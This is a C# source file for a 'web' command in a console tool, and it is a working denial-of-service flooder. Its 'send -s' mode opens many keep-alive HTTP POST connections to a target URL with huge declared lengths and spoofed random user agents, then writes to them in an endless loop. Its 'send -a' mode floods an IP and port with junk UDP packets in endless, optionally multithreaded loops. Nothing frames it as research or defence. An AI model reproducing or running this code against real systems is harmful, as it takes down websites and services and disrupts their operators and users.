using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Ultimate_Most_Advanced___Console.Language;

namespace Ultimate_Most_Advanced___Console.Commands.Command
{
    public struct web
    {
        private static long Type = new long();

        private static string WEB_URL = string.Empty;
        private static string WEB_Word = string.Empty;
        private static long WEB_Size = new long();
        private static long WEB_Amount = new long();

        public static string IP_Address = string.Empty;
        public static int IP_Port = new int();
        private static long IP_Size = new long();
        private static long IP_Amount = new long();

        public static bool Multicore = new bool();
        public static long Multicore_Size = new long();

        public web(string[] args)
        {
            try
            {
                switch (args[0])
                {
                    case "send":
                        {
                            switch (args[1])
                            {
                                //S = Site, send to website.
                                case "-s":
                                    {
                                        Type = 1;

                                        if (!string.IsNullOrWhiteSpace(args[2]))
                                        {
                                            WEB_URL = args[2];
                                        }
                                        else
                                        {
                                            Console.WriteLine(enUS.get(Global.Messages.WEB_INVALID_PARAMETER));

                                            break;
                                        }

                                        switch (args[3])
                                        {
                                            case "-a":
                                                {
                                                    WEB_Amount = long.Parse(args[4], CultureInfo.InvariantCulture);
                                                }
                                                break;

                                            case "-p":
                                                {
                                                    if (!string.IsNullOrWhiteSpace(args[4]))
                                                    {
                                                        WEB_Size = long.Parse(args[4], CultureInfo.InvariantCulture);
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine(enUS.get(Global.Messages.WEB_INVALID_PARAMETER));
                                                    }
                                                }
                                                break;

                                            case "-w":
                                                {
                                                    if (!string.IsNullOrWhiteSpace(args[4]))
                                                    {
                                                        WEB_Word = (((args[4]).Replace("_", " ")).Replace("-", " "));
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine(enUS.get(Global.Messages.WEB_INVALID_PARAMETER));
                                                    }
                                                }
                                                break;
                                        }

                                        switch (args[5])
                                        {
                                            case "-a":
                                                {
                                                    WEB_Amount = long.Parse(args[6], CultureInfo.InvariantCulture);
                                                }
                                                break;

                                            case "-p":
                                                {
                                                    if (!string.IsNullOrWhiteSpace(args[6]))
                                                    {
                                                        WEB_Size = long.Parse(args[6], CultureInfo.InvariantCulture);
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine(enUS.get(Global.Messages.WEB_INVALID_PARAMETER));
                                                    }
                                                }
                                                break;

                                            case "-w":
                                                {
                                                    if (!string.IsNullOrWhiteSpace(args[6]))
                                                    {
                                                        WEB_Word = (((args[6]).Replace("_", " ")).Replace("-", " "));
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine(enUS.get(Global.Messages.WEB_INVALID_PARAMETER));
                                                    }
                                                }
                                                break;
                                        }

                                        switch (args[7])
                                        {
                                            case "-a":
                                                {
                                                    WEB_Amount = long.Parse(args[8], CultureInfo.InvariantCulture);
                                                }
                                                break;

                                            case "-p":
                                                {
                                                    if (!string.IsNullOrWhiteSpace(args[8]))
                                                    {
                                                        WEB_Size = long.Parse(args[8], CultureInfo.InvariantCulture);
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine(enUS.get(Global.Messages.WEB_INVALID_PARAMETER));
                                                    }
                                                }
                                                break;

                                            case "-w":
                                                {
                                                    if (!string.IsNullOrWhiteSpace(args[8]))
                                                    {
                                                        WEB_Word = (((args[8]).Replace("_", " ")).Replace("-", " "));
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine(enUS.get(Global.Messages.WEB_INVALID_PARAMETER));
                                                    }
                                                }
                                                break;
                                        }
                                    }
                                    break;

                                //A = Address, send to website address.
                                case "-a":
                                    {
                                        Type = 2;

                                        if (!string.IsNullOrWhiteSpace(args[2]))
                                        {
                                            IP_Address = args[2];
                                        }
                                        else
                                        {
                                            Console.WriteLine(enUS.get(Global.Messages.WEB_INVALID_PARAMETER));

                                            break;
                                        }

                                        switch (args[3])
                                        {
                                            case "-p":
                                                {
                                                    IP_Size = long.Parse(args[4], CultureInfo.InvariantCulture);
                                                }
                                                break;

                                            case "-a":
                                                {
                                                    IP_Amount = long.Parse(args[4], CultureInfo.InvariantCulture);
                                                }
                                                break;

                                            case "-i":
                                                {
                                                    IP_Port = int.Parse(args[4], CultureInfo.InvariantCulture);
                                                }
                                                break;
                                        }

                                        switch (args[5])
                                        {
                                            case "-p":
                                                {
                                                    IP_Size = long.Parse(args[6], CultureInfo.InvariantCulture);
                                                }
                                                break;

                                            case "-a":
                                                {
                                                    IP_Amount = long.Parse(args[6], CultureInfo.InvariantCulture);
                                                }
                                                break;

                                            case "-i":
                                                {
                                                    IP_Port = int.Parse(args[6], CultureInfo.InvariantCulture);
                                                }
                                                break;
                                        }

                                        switch (args[7])
                                        {
                                            case "-p":
                                                {
                                                    IP_Size = long.Parse(args[8], CultureInfo.InvariantCulture);
                                                }
                                                break;

                                            case "-a":
                                                {
                                                    IP_Amount = long.Parse(args[8], CultureInfo.InvariantCulture);
                                                }
                                                break;

                                            case "-i":
                                                {
                                                    IP_Port = int.Parse(args[8], CultureInfo.InvariantCulture);
                                                }
                                                break;
                                        }
                                    }
                                    break;
                            }

                            switch (Type)
                            {
                                case 1:
                                    {
                                        Protocol.Site(WEB_URL, WEB_Size, WEB_Word, WEB_Amount);
                                    }
                                    break;

                                case 2:
                                    {
                                        Thread.Sleep(2500);

                                        if (Multicore)
                                        {
                                            Console.WriteLine(enUS.get(Global.Messages.IP_SENDED_WITH_MULTICORE));

                                            for (long i = 0; i < IP_Amount; i++)
                                            {
                                                var thread = new Thread(() => Protocol.Address(IP_Address, IP_Port, IP_Size, IP_Amount));

                                                thread.Start();
                                            }
                                        }
                                        else
                                        {
                                            Console.WriteLine(enUS.get(Global.Messages.IP_SENDED_WITHOUT_MULTICORE));

                                            for (long i = 0; i < IP_Amount; i++)
                                            {
                                                Protocol.Address(IP_Address, IP_Port, IP_Size, IP_Amount);
                                            }
                                        }
                                    }
                                    break;
                            }
                        }
                        break;

                    case "multicore":
                        {
                            if (args.Length == 1)
                            {
                                Console.WriteLine(enUS.get(Global.Messages.WEB_INVALID_PARAMETER));

                                return;
                            }

                            switch (args[1])
                            {
                                case "-v":
                                    {
                                        if (args.Length != 2)
                                        {
                                            Multicore_Size = long.Parse(args[2], CultureInfo.InvariantCulture);
                                        }
                                        else
                                        {
                                            Console.WriteLine(enUS.get(Global.Messages.WEB_INVALID_PARAMETER));

                                            return;
                                        }
                                    }
                                    break;
                            }

                            if (Program.High_Experimental)
                            {
                                if (!Multicore)
                                {
                                    Multicore = true;

                                    Console.WriteLine((enUS.get(Global.Messages.WEB_MULTICORE_ENABLED).Replace("[power]", "" + Multicore_Size)));
                                }
                                else
                                {
                                    Multicore = new bool();
                                    Multicore_Size = new long();

                                    Console.WriteLine(enUS.get(Global.Messages.WEB_MULTICORE_DISABLED));
                                }
                            }
                            else
                            {
                                Console.WriteLine(enUS.get(Global.Messages.HIGH_EXPERIMENTAL_NOT_ENABLED));
                            }
                        }
                        break;

                    default:
                        {
                            Console.WriteLine(enUS.get(Global.Messages.WEB_INVALID_PARAMETER));
                        }
                        break;
                }
            }
            catch (Exception Ex) { Console.WriteLine("[ERROR 1] " + Ex.Message); Console.ReadLine(); }
        }
    }

    public class Protocol
    {
        private static CookieContainer CJ;

        private static Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

        public static void Site(string URL, long Size, string Word, long Amount)
        {
            CJ = new CookieContainer();
            HttpWebRequest Request = (HttpWebRequest)WebRequest.Create(new Uri(URL));

            Request.ContentType = "application/x-www-form-urlencoded";
            Request.Referer = URL;
            Request.UserAgent = GenerateRandomUserAgent();
            Request.CookieContainer = CJ;

            HttpWebResponse Response = (HttpWebResponse)Request.GetResponse();

            Thread.Sleep(1 * 1000);

            List<HttpWebRequest> ConnectionList = new List<HttpWebRequest>();

            Stream TempStream;
            Random RandomLength = new Random(DateTime.Now.Millisecond);

            for (int i = 0; i < Amount; i++)
            {
                HttpWebRequest TempRequest = (HttpWebRequest)WebRequest.Create(new Uri(URL));

                TempRequest.ContentType = "application/x-www-form-urlencoded";
                TempRequest.UserAgent = GenerateRandomUserAgent();
                TempRequest.CookieContainer = CJ;

                TempRequest.Method = WebRequestMethods.Http.Post;
                TempRequest.KeepAlive = true;
                TempRequest.ContentLength = RandomLength.Next(20000000, 100000000);
                TempRequest.ServicePoint.ConnectionLimit = 10000;

                ConnectionList.Add(TempRequest);
            }

            while (true)
            {
                for (int i = 0; i < Amount; i++)
                {
                    for (long j = 0; j < Size; j++)
                    {
                        TempStream = ConnectionList[i].GetRequestStream();
                        TempStream.Write(Encoding.Default.GetBytes(Word), 0, Encoding.Default.GetBytes(Word).Length);

                        Console.WriteLine((enUS.get(Global.Messages.WEB_SENDED)).Replace("[word]", Word).Replace("[url]", URL).Replace("[size]", "" + Size));
                    }
                }

                GC.Collect();
            }
        }

        private static string GenerateRandomUserAgent()
        {
            string[] Users = new string[] {
                "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
                "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
                "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
                "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
                "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
                "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
                "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
                "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
                "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
                "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
                "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
                "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
                "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
                "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
                "Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
                "Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
                "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
                "Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
                "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
                "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
                "Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
                "Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
                "Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
                "Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
                "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
                "Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
                "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
                "Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
                "Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
                "Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
                "Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
                "Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
                "Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
                "Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
                "Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
                "Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
                "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
                "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
                "Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
                "Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
                "Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
                "Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
                "Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
                "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
                "Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
                "Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
                "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
                "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
            };

            return Users[(new Random().Next(0, 80))];
        }

        public static void Address(string IP, int Port, long Size, long Amount)
        {
            try
            {
                IPEndPoint _Address = new IPEndPoint(IPAddress.Parse(web.IP_Address), web.IP_Port);

                if (!web.Multicore)
                {
                    new Thread(() =>
                    {
                        while (true)
                        {
                            for (long i = 0; i <= Amount; i++)
                            {
                                for (long j = 0; j < Size; j++)
                                {
                                    socket.SendTo(Encoding.Default.GetBytes("as4d8sa4d8asf1s81as91asf98s1g984r98q4w98rq4wr8942-da4dsa8d94as8f498sa40w98q4ewq98e04qwe4wq-0ewq*-e0-wq*eq7w+ewq-e7-qwewq90e7wq87e0&*&*W&E*(Q&()*&@(*)#&!@()*#&(@*#@!#_@!#*(@#_*(8s0dqw[[´´[op~][´~]p´p]´~]´~[~]ç[~];/;;/;/.,.;,.,.<><><>,:>:?}Ç^}`{P`{{`P+_)_(_@$)*!²¹³²¹£³³¬¬¬³°?/?//?°/?°///////////°°°°°°°°°???????₢₢₢₢cçzclaçdl´pwe´qpo´pqti´wqie´pwqe´wqAsd asdae wqeqwewq e eqw  r qw qw t 5 23 4 q3r y ey5 e 63 4  sg \\s gs g\\ g\\sgg\\ \\ gg\\ d\\gg\\d\\ sd er q 423,14 14 124 2 ,2. 4,q. w,d as,d , ,a d,asd wd ,wq. qw,e w, e,wq ewq., e,q we. wq,e 2.1 312ç31 m2ç31çl3ç2l 3çl1 3çl21 3çl1 3çl1 4çl 7çl 76çl9867l5 6çl3çl4 m5çl çl çle çl jlç lçuj çlel tr çtle tçl 5çw wçlrw eçrwer wwrlç wçlrs31/*-213/*-213/-12*3/*2-13/2*-*-qawsdas-dasd7-as*7d*-7wqe-*wqe*-d*-aasd-as*d"), _Address);

                                    Console.WriteLine((enUS.get(Global.Messages.IP_SENDED)).Replace("[address]", _Address.ToString()).Replace("[size]", "" + Size));
                                }
                            }

                            GC.Collect();
                        }
                    }).Start();
                }
                else
                {
                    Parallel.For(1, web.Multicore_Size, i =>
                    {
                        while (true)
                        {
                            for (long j = 0; j <= Amount; j++)
                            {
                                for (long k = 0; k < Size; k++)
                                {
                                    socket.SendTo(Encoding.Default.GetBytes("as4d8sa4d8asf1s81as91asf98s1g984r98q4w98rq4wr8942-da4dsa8d94as8f498sa40w98q4ewq98e04qwe4wq-0ewq*-e0-wq*eq7w+ewq-e7-qwewq90e7wq87e0&*&*W&E*(Q&()*&@(*)#&!@()*#&(@*#@!#_@!#*(@#_*(8s0dqw[[´´[op~][´~]p´p]´~]´~[~]ç[~];/;;/;/.,.;,.,.<><><>,:>:?}Ç^}`{P`{{`P+_)_(_@$)*!²¹³²¹£³³¬¬¬³°?/?//?°/?°///////////°°°°°°°°°???????₢₢₢₢cçzclaçdl´pwe´qpo´pqti´wqie´pwqe´wqAsd asdae wqeqwewq e eqw  r qw qw t 5 23 4 q3r y ey5 e 63 4  sg \\s gs g\\ g\\sgg\\ \\ gg\\ d\\gg\\d\\ sd er q 423,14 14 124 2 ,2. 4,q. w,d as,d , ,a d,asd wd ,wq. qw,e w, e,wq ewq., e,q we. wq,e 2.1 312ç31 m2ç31çl3ç2l 3çl1 3çl21 3çl1 3çl1 4çl 7çl 76çl9867l5 6çl3çl4 m5çl çl çle çl jlç lçuj çlel tr çtle tçl 5çw wçlrw eçrwer wwrlç wçlrs31/*-213/*-213/-12*3/*2-13/2*-*-qawsdas-dasd7-as*7d*-7wqe-*wqe*-d*-aasd-as*d"), _Address);

                                    Console.WriteLine((enUS.get(Global.Messages.IP_SENDED)).Replace("[address]", _Address.ToString()).Replace("[size]", "" + Size));
                                }
                            }

                            GC.Collect();
                        }
                    });
                }
            }
            catch (Exception Ex) { Console.WriteLine(Ex.Message); Console.ReadLine(); }
        }
    }
}
